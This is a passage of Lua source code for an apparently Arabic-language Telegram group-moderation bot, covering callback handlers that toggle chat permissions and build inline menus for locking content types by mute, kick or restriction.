LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, false, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, true, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/invite') then
local UserId = Text:match('(%d+)/invite')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).invite == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, false, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, true, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/pin') then
local UserId = Text:match('(%d+)/pin')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).pin == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, false)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, true)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/media') then
local UserId = Text:match('(%d+)/media')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).media == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, false, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, true, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/messges') then
local UserId = Text:match('(%d+)/messges')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).messges == true then
LuaTele.setChatPermissions(ChatId, false, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, true, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/other') then
local UserId = Text:match('(%d+)/other')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).other == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, false, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, true, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/polls') then
local UserId = Text:match('(%d+)/polls')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).polls == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, false, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, true, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
end
if Text and Text:match('(%d+)/listallAddorrem') then
local UserId = Text:match('(%d+)/listallAddorrem')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'تعطيل الرابط', data = IdUser..'/'.. 'unmute_link'},{text = 'تفعيل الرابط', data = IdUser..'/'.. 'mute_link'},
},
{
{text = 'تعطيل الترحيب', data = IdUser..'/'.. 'unmute_welcome'},{text = 'تفعيل الترحيب', data = IdUser..'/'.. 'mute_welcome'},
},
{
{text = 'اتعطيل الايدي', data = IdUser..'/'.. 'unmute_Id'},{text = 'اتفعيل الايدي', data = IdUser..'/'.. 'mute_Id'},
},
{
{text = 'تعطيل الايدي بالصوره', data = IdUser..'/'.. 'unmute_IdPhoto'},{text = 'تفعيل الايدي بالصوره', data = IdUser..'/'.. 'mute_IdPhoto'},
},
{
{text = 'تعطيل الردود', data = IdUser..'/'.. 'unmute_ryple'},{text = 'تفعيل الردود', data = IdUser..'/'.. 'mute_ryple'},
},
{
{text = 'تعطيل الردود العامه', data = IdUser..'/'.. 'unmute_ryplesudo'},{text = 'تفعيل الردود العامه', data = IdUser..'/'.. 'mute_ryplesudo'},
},
{
{text = 'تعطيل الرفع', data = IdUser..'/'.. 'unmute_setadmib'},{text = 'تفعيل الرفع', data = IdUser..'/'.. 'mute_setadmib'},
},
{
{text = 'تعطيل الطرد', data = IdUser..'/'.. 'unmute_kickmembars'},{text = 'تفعيل الطرد', data = IdUser..'/'.. 'mute_kickmembars'},
},
{
{text = 'تعطيل الالعاب', data = IdUser..'/'.. 'unmute_games'},{text = 'تفعيل الالعاب', data = IdUser..'/'.. 'mute_games'},
},
{
{text = 'تعطيل اطردني', data = IdUser..'/'.. 'unmute_kickme'},{text = 'تفعيل اطردني', data = IdUser..'/'.. 'mute_kickme'},
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '- اخفاء الامر ', data =IdUser..'/'.. 'delAmr'}
},
}
}
return edit(ChatId,Msg_id,'٠ اوامر التفعيل والتعطيل ', 'md', false, false, reply_markup)
end
end
if Text and Text:match('(%d+)/NextSeting') then
local UserId = Text:match('(%d+)/NextSeting')
if tonumber(IdUser) == tonumber(UserId) then
local Text = "*\n٠ اعدادات الكروب ".."\n٠ علامة ال (✔️) تعني مقفول".."\n٠ علامة ال (❌) تعني مفتوح*"
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = GetSetieng(ChatId).lock_fwd, data = '&'},{text = 'التوجبه : ', data =IdUser..'/'.. 'Status_fwd'},
},
{
{text = GetSetieng(ChatId).lock_muse, data = '&'},{text = 'الصوت : ', data =IdUser..'/'.. 'Status_audio'},
},
{
{text = GetSetieng(ChatId).lock_ste, data = '&'},{text = 'الملصقات : ', data =IdUser..'/'.. 'Status_stikear'},
},
{
{text = GetSetieng(ChatId).lock_phon, data = '&'},{text = 'الجهات : ', data =IdUser..'/'.. 'Status_phone'},
},
{
{text = GetSetieng(ChatId).lock_join, data = '&'},{text = 'الدخول : ', data =IdUser..'/'.. 'Status_joine'},
},
{
{text = GetSetieng(ChatId).lock_add, data = '&'},{text = 'الاضافه : ', data =IdUser..'/'.. 'Status_addmem'},
},
{
{text = GetSetieng(ChatId).lock_self, data = '&'},{text = 'بصمه فيديو : ', data =IdUser..'/'.. 'Status_videonote'},
},
{
{text = GetSetieng(ChatId).lock_pin, data = '&'},{text = 'التثبيت : ', data =IdUser..'/'.. 'Status_pin'},
},
{
{text = GetSetieng(ChatId).lock_tagservr, data = '&'},{text = 'الاشعارات : ', data =IdUser..'/'.. 'Status_tgservir'},
},
{
{text = GetSetieng(ChatId).lock_mark, data = '&'},{text = 'الماركدون : ', data =IdUser..'/'.. 'Status_markdaun'},
},
{
{text = GetSetieng(ChatId).lock_edit, data = '&'},{text = 'التعديل : ', data =IdUser..'/'.. 'Status_edits'},
},
{
{text = GetSetieng(ChatId).lock_geam, data = '&'},{text = 'الالعاب : ', data =IdUser..'/'.. 'Status_games'},
},
{
{text = GetSetieng(ChatId).flood, data = '&'},{text = 'التكرار : ', data =IdUser..'/'.. 'Status_flood'},
},
{
{text = '- الرجوع ... ', data =IdUser..'/'.. 'NoNextSeting'}
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '- اخفاء الامر ', data =IdUser..'/'.. '/delAmr'}
},
}
}
edit(ChatId,Msg_id,Text, 'md', false, false, reply_markup)
end
end
if Text and Text:match('(%d+)/NoNextSeting') then
local UserId = Text:match('(%d+)/NoNextSeting')
if tonumber(IdUser) == tonumber(UserId) then
local Text = "*\n٠ اعدادات الكروب ".."\n٠ علامة ال (✔️) تعني مقفول".."\n٠ علامة ال (❌) تعني مفتوح*"
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = GetSetieng(ChatId).lock_links, data = '&'},{text = 'الروابط : ', data =IdUser..'/'.. 'Status_link'},
},
{
{text = GetSetieng(ChatId).lock_spam, data = '&'},{text = 'الكلايش : ', data =IdUser..'/'.. 'Status_spam'},
},
{
{text = GetSetieng(ChatId).lock_inlin, data = '&'},{text = 'الكيبورد : ', data =IdUser..'/'.. 'Status_keypord'},
},
{
{text = GetSetieng(ChatId).lock_vico, data = '&'},{text = 'الاغاني : ', data =IdUser..'/'.. 'Status_voice'},
},
{
{text = GetSetieng(ChatId).lock_gif, data = '&'},{text = 'المتحركه : ', data =IdUser..'/'.. 'Status_gif'},
},
{
{text = GetSetieng(ChatId).lock_file, data = '&'},{text = 'الملفات : ', data =IdUser..'/'.. 'Status_files'},
},
{
{text = GetSetieng(ChatId).lock_text, data = '&'},{text = 'الدردشه : ', data =IdUser..'/'.. 'Status_text'},
},
{
{text = GetSetieng(ChatId).lock_ved, data = '&'},{text = 'الفيديو : ', data =IdUser..'/'.. 'Status_video'},
},
{
{text = GetSetieng(ChatId).lock_photo, data = '&'},{text = 'الصور : ', data =IdUser..'/'.. 'Status_photo'},
},
{
{text = GetSetieng(ChatId).lock_user, data = '&'},{text = 'المعرفات : ', data =IdUser..'/'.. 'Status_username'},
},
{
{text = GetSetieng(ChatId).lock_hash, data = '&'},{text = 'التاك : ', data =IdUser..'/'.. 'Status_tags'},
},
{
{text = GetSetieng(ChatId).lock_bots, data = '&'},{text = 'البوتات : ', data =IdUser..'/'.. 'Status_bots'},
},
{
{text = '- التالي ... ', data =IdUser..'/'.. 'NextSeting'}
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '- اخفاء الامر ', data =IdUser..'/'.. 'delAmr'}
},
}
}
edit(ChatId,Msg_id,Text, 'md', false, false, reply_markup)
end
end 
if Text and Text:match('(%d+)/delAmr') then
local UserId = Text:match('(%d+)/delAmr')
if tonumber(IdUser) == tonumber(UserId) then
return LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
end
end
if Text and Text:match('(%d+)/Status_link') then
local UserId = Text:match('(%d+)/Status_link')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الروابط', data =UserId..'/'.. 'lock_link'},{text = 'قفل الروابط بالكتم', data =UserId..'/'.. 'lock_linkktm'},
},
{
{text = 'قفل الروابط بالطرد', data =UserId..'/'.. 'lock_linkkick'},{text = 'قفل الروابط بالتقييد', data =UserId..'/'.. 'lock_linkkid'},
},
{
{text = 'فتح الروابط', data =UserId..'/'.. 'unlock_link'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الروابط", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_spam') then
local UserId = Text:match('(%d+)/Status_spam')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الكلايش', data =UserId..'/'.. 'lock_spam'},{text = 'قفل الكلايش بالكتم', data =UserId..'/'.. 'lock_spamktm'},
},
{
{text = 'قفل الكلايش بالطرد', data =UserId..'/'.. 'lock_spamkick'},{text = 'قفل الكلايش بالتقييد', data =UserId..'/'.. 'lock_spamid'},
},
{
{text = 'فتح الكلايش', data =UserId..'/'.. 'unlock_spam'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الكلايش", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_keypord') then
local UserId = Text:match('(%d+)/Status_keypord')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الكيبورد', data =UserId..'/'.. 'lock_keypord'},{text = 'قفل الكيبورد بالكتم', data =UserId..'/'.. 'lock_keypordktm'},
},
{
{text = 'قفل الكيبورد بالطرد', data =UserId..'/'.. 'lock_keypordkick'},{text = 'قفل الكيبورد بالتقييد', data =UserId..'/'.. 'lock_keypordkid'},
},
{
{text = 'فتح الكيبورد', data =UserId..'/'.. 'unlock_keypord'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الكيبورد", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_voice') then
local UserId = Text:match('(%d+)/Status_voice')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الاغاني', data =UserId..'/'.. 'lock_voice'},{text = 'قفل الاغاني بالكتم', data =UserId..'/'.. 'lock_voicektm'},
},
{
{text = 'قفل الاغاني بالطرد', data =UserId..'/'.. 'lock_voicekick'},{text = 'قفل الاغاني بالتقييد', data =UserId..'/'.. 'lock_voicekid'},
},
{
{text = 'فتح الاغاني', data =UserId..'/'.. 'unlock_voice'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الاغاني", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_gif') then
local UserId = Text:match('(%d+)/Status_gif')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل المتحركه', data =UserId..'/'.. 'lock_gif'},{text = 'قفل المتحركه بالكتم', data =UserId..'/'.. 'lock_gifktm'},
},
{
{text = 'قفل المتحركه بالطرد', data =UserId..'/'.. 'lock_gifkick'},{text = 'قفل المتحركه بالتقييد', data =UserId..'/'.. 'lock_gifkid'},
},
{
{text = 'فتح المتحركه', data =UserId..'/'.. 'unlock_gif'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر المتحركات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_files') then
local UserId = Text:match('(%d+)/Status_files')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الملفات', data =UserId..'/'.. 'lock_files'},{text = 'قفل الملفات بالكتم', data =UserId..'/'.. 'lock_filesktm'},
},
{
{text = 'قفل الملفات بالطرد', data =UserId..'/'.. 'lock_fileskick'},{text = 'قفل الملفات بالتقييد', data =UserId..'/'.. 'lock_fileskid'},
},
{
{text = 'فتح الملفات', data =UserId..'/'.. 'unlock_files'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الملفات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_text') then
local UserId = Text:match('(%d+)/Status_text')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الدردشه', data =UserId..'/'.. 'lock_text'},
},
{
{text = 'فتح الدردشه', data =UserId..'/'.. 'unlock_text'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الدردشه", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_video') then
local UserId = Text:match('(%d+)/Status_video')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الفيديو', data =UserId..'/'.. 'lock_video'},{text = 'قفل الفيديو بالكتم', data =UserId..'/'.. 'lock_videoktm'},
},
{
{text = 'قفل الفيديو بالطرد', data =UserId..'/'.. 'lock_videokick'},{text = 'قفل الفيديو بالتقييد', data =UserId..'/'.. 'lock_videokid'},
},
{
{text = 'فتح الفيديو', data =UserId..'/'.. 'unlock_video'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الفيديو", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_photo') then
local UserId = Text:match('(%d+)/Status_photo')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الصور', data =UserId..'/'.. 'lock_photo'},{text = 'قفل الصور بالكتم', data =UserId..'/'.. 'lock_photoktm'},
},
{
{text = 'قفل الصور بالطرد', data =UserId..'/'.. 'lock_photokick'},{text = 'قفل الصور بالتقييد', data =UserId..'/'.. 'lock_photokid'},
},
{
{text = 'فتح الصور', data =UserId..'/'.. 'unlock_photo'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الصور", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_username') then
local UserId = Text:match('(%d+)/Status_username')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل المعرفات', data =UserId..'/'.. 'lock_username'},{text = 'قفل المعرفات بالكتم', data =UserId..'/'.. 'lock_usernamektm'},
},
{
{text = 'قفل المعرفات بالطرد', data =UserId..'/'.. 'lock_usernamekick'},{text = 'قفل المعرفات بالتقييد', data =UserId..'/'.. 'lock_usernamekid'},
},
{
{text = 'فتح المعرفات', data =UserId..'/'.. 'unlock_username'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر المعرفات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_tags') then
local UserId = Text:match('(%d+)/Status_tags')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التاك', data =UserId..'/'.. 'lock_tags'},{text = 'قفل التاك بالكتم', data =UserId..'/'.. 'lock_tagsktm'},
},
{
{text = 'قفل التاك بالطرد', data =UserId..'/'.. 'lock_tagskick'},{text = 'قفل التاك بالتقييد', data =UserId..'/'.. 'lock_tagskid'},
},
{
{text = 'فتح التاك', data =UserId..'/'.. 'unlock_tags'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر التاك", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_bots') then
local UserId = Text:match('(%d+)/Status_bots')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل البوتات', data =UserId..'/'.. 'lock_bots'},{text = 'قفل البوتات بالطرد', data =UserId..'/'.. 'lock_botskick'},
},
{
{text = 'فتح البوتات', data =UserId..'/'.. 'unlock_bots'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر البوتات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_fwd') then
local UserId = Text:match('(%d+)/Status_fwd')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التوجيه', data =UserId..'/'.. 'lock_fwd'},{text = 'قفل التوجيه بالكتم', data =UserId..'/'.. 'lock_fwdktm'},
},
{
{text = 'قفل التوجيه بالطرد', data =UserId..'/'.. 'lock_fwdkick'},{text = 'قفل التوجيه بالتقييد', data =UserId..'/'.. 'lock_fwdkid'},
},
{
{text = 'فتح التوجيه', data =UserId..'/'.. 'unlock_link'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر التوجيه", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_audio') then
local UserId = Text:match('(%d+)/Status_audio')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الصوت', data =UserId..'/'.. 'lock_audio'},{text = 'قفل الصوت بالكتم', data =UserId..'/'.. 'lock_audioktm'},
},
{
{text = 'قفل الصوت بالطرد', data =UserId..'/'.. 'lock_audiokick'},{text = 'قفل الصوت بالتقييد', data =UserId..'/'.. 'lock_audiokid'},
},
{
{text = 'فتح الصوت', data =UserId..'/'.. 'unlock_audio'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الصوت", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_stikear') then
local UserId = Text:match('(%d+)/Status_stikear')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الملصقات', data =UserId..'/'.. 'lock_stikear'},{text = 'قفل الملصقات بالكتم', data =UserId..'/'.. 'lock_stikearktm'},
},
{
{text = 'قفل الملصقات بالطرد', data =UserId..'/'.. 'lock_stikearkick'},{text = 'قفل الملصقات بالتقييد', data =UserId..'/'.. 'lock_stikearkid'},
},
{
{text = 'فتح الملصقات', data =UserId..'/'.. 'unlock_stikear'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الملصقات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_phone') then
local UserId = Text:match('(%d+)/Status_phone')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الجهات', data =UserId..'/'.. 'lock_phone'},{text = 'قفل الجهات بالكتم', data =UserId..'/'.. 'lock_phonektm'},
},
{
{text = 'قفل الجهات بالطرد', data =UserId..'/'.. 'lock_phonekick'},{text = 'قفل الجهات بالتقييد', data =UserId..'/'.. 'lock_phonekid'},
},
{
{text = 'فتح الجهات', data =UserId..'/'.. 'unlock_phone'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الجهات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_joine') then
local UserId = Text:match('(%d+)/Status_joine')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الدخول', data =UserId..'/'.. 'lock_joine'},
},
{
{text = 'فتح الدخول', data =UserId..'/'.. 'unlock_joine'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الدخول", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_addmem') then
local UserId = Text:match('(%d+)/Status_addmem')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الاضافه', data =UserId..'/'.. 'lock_addmem'},
},
{
{text = 'فتح الاضافه', data =UserId..'/'.. 'unlock_addmem'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الاضافه", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_videonote') then
local UserId = Text:match('(%d+)/Status_videonote')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل السيلفي', data =UserId..'/'.. 'lock_videonote'},{text = 'قفل السيلفي بالكتم', data =UserId..'/'.. 'lock_videonotektm'},
},
{
{text = 'قفل السيلفي بالطرد', data =UserId..'/'.. 'lock_videonotekick'},{text = 'قفل السيلفي بالتقييد', data =UserId..'/'.. 'lock_videonotekid'},
},
{
{text = 'فتح السيلفي', data =UserId..'/'.. 'unlock_videonote'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر بصمه الفيديو", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_pin') then
local UserId = Text:match('(%d+)/Status_pin')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التثبيت', data =UserId..'/'.. 'lock_pin'},
},
{
{text = 'فتح التثبيت', data =UserId..'/'.. 'unlock_pin'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر التثبيت", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_tgservir') then
local UserId = Text:match('(%d+)/Status_tgservir')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الاشعارات', data =UserId..'/'.. 'lock_tgservir'},
},
{
{text = 'فتح الاشعارات', data =UserId..'/'.. 'unlock_tgservir'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الاشعارات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_markdaun') then
local UserId = Text:match('(%d+)/Status_markdaun')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الماركداون', data =UserId..'/'.. 'lock_markdaun'},{text = 'قفل الماركداون بالكتم', data =UserId..'/'.. 'lock_markdaunktm'},
},
{
{text = 'قفل الماركداون بالطرد', data =UserId..'/'.. 'lock_markdaunkick'},{text = 'قفل الماركداون بالتقييد', data =UserId..'/'.. 'lock_markdaunkid'},
},
{
{text = 'فتح الماركداون', data =UserId..'/'.. 'unlock_markdaun'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الماركدون", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_edits') then
local UserId = Text:match('(%d+)/Status_edits')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التعديل', data =UserId..'/'.. 'lock_edits'},
},
{
{text = 'فتح التعديل', data =UserId..'/'.. 'unlock_edits'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر التعديل", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_games') then
local UserId = Text:match('(%d+)/Status_games')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الالعاب', data =UserId..'/'.. 'lock_games'},{text = 'قفل الالعاب بالكتم', data =UserId..'/'.. 'lock_gamesktm'},
},
{
{text = 'قفل الالعاب بالطرد', data =UserId..'/'.. 'lock_gameskick'},{text = 'قفل الالعاب بالتقييد', data =UserId..'/'.. 'lock_gameskid'},
},
{
{text = 'فتح الالعاب', data =UserId..'/'.. 'unlock_games'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر الالعاب", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_flood') then
local UserId = Text:match('(%d+)/Status_flood')
